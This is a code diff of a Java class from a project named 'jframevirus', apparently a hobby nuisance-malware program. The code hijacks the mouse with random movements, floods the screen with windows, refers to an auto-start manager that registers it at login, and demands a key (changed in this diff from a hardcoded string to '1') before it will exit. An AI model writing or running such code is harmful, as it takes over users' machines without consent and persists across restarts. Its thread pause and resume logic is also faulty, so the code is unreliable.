@@ -1,14 +1,20 @@
 package com.joo.jframevirus;
 
 import com.joo.jframevirus.autostart.AutoStartManager;
+import com.joo.jframevirus.keydialog.FailureException;
+import com.joo.jframevirus.keydialog.KeyDialog;
 
-import javax.swing.*;
 import java.awt.*;
 import java.awt.event.KeyEvent;
 
 public class MainController {
     private Dimension screenSize;
     private Robot robot;
+    private Thread mouseThread,
+            jframeThread;
+    private KeyDialog keyDialog;
+
+    public static final String KEY = "1";
 
     public MainController() {
         init();
@@ -25,6 +31,37 @@ public class MainController {
         } catch (AWTException e) {
             e.printStackTrace();
         }
+        initializeThreads();
+        keyDialog = new KeyDialog();
+    }
+
+    private void initializeThreads() {
+        initializeMouseThread();
+        initializeJFrameThreads();
+    }
+
+    private void initializeJFrameThreads() {
+        jframeThread = new Thread(() -> {
+            // TODO: 5/16/22 Make this a while loop
+            for (int i = 0; i < 100; i++) {
+                new RandomFrame(screenSize);
+                try {
+                    Thread.sleep(5000);
+                } catch (InterruptedException e) {
+                    e.printStackTrace();
+                }
+            }
+        });
+    }
+
+    private void initializeMouseThread() {
+        mouseThread = new Thread(() -> {
+            // TODO: 5/15/22 Make this a while loop
+            for (byte i = 0; i < 10; i++) {
+                robot.mouseMove((int) (Math.random() * screenSize.getWidth()),
+                        (int) (Math.random() * screenSize.getHeight()));
+            }
+        });
     }
 
     // TODO: 5/15/22 Tst this in windows
@@ -32,44 +69,46 @@ public class MainController {
         KeyboardFocusManager.getCurrentKeyboardFocusManager().addKeyEventDispatcher(e -> {
             if (e.getID() == KeyEvent.KEY_PRESSED) {
                 if (e.getKeyCode() == KeyEvent.VK_ESCAPE) {
-                    VirusStopKey();
-//                    // Remove the virus from the startup programs
-//                    AutoStartManager.getInstance().removeVirusFromStartup();
-//                    // Exit the virus
-//                    System.exit(0);
+                    // Pause the threads
+                    pauseThreads();
+                    // Show a dialog to get the key
+                    virusStopKey();
                 }
             }
             return false;
         });
     }
 
+    private void pauseThreads() {
+        try {
+            mouseThread.join();
+            jframeThread.join();
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }
+    }
+
     public void startMouseMoving() {
-        new Thread(() -> {
-            // TODO: 5/15/22 Make this a while loop
-            for (byte i = 0; i < 10; i++) {
-                robot.mouseMove((int) (Math.random() * screenSize.getWidth()),
-                        (int) (Math.random() * screenSize.getHeight()));
-            }
-        }).start();
+        mouseThread.start();
     }
-    public void startRandomFrame(){
-        new Thread(() -> {
-            for (int i = 0; i < 1000; i++) {
-                new RandomFrame(screenSize);
-            }
-        }).start();
+
+    public void startRandomFrame() {
+        jframeThread.start();
     }
-    public void VirusStopKey(){
-           String input;
-           String Key = "AnasAndJooVirus8092789166";
-           String Massage ="To stop virus write Key ";
-             try {
-             input = JOptionPane.showInputDialog(Massage);
-             if (input.equals(Key)){
-                 System.exit(0);
-             }
-             } catch (Exception e) {
-                 new MainController();
-             }
+
+    public void virusStopKey() {
+        try {
+            keyDialog.showDialog();
+            // If continue then exit
+            System.exit(0);
+        } catch (FailureException e) {
+            resumeThreads();
+        }
+    }
+
+    private void resumeThreads() {
+        synchronized(MainController.this) {
+            MainController.this.notifyAll();
+        }
     }
 }
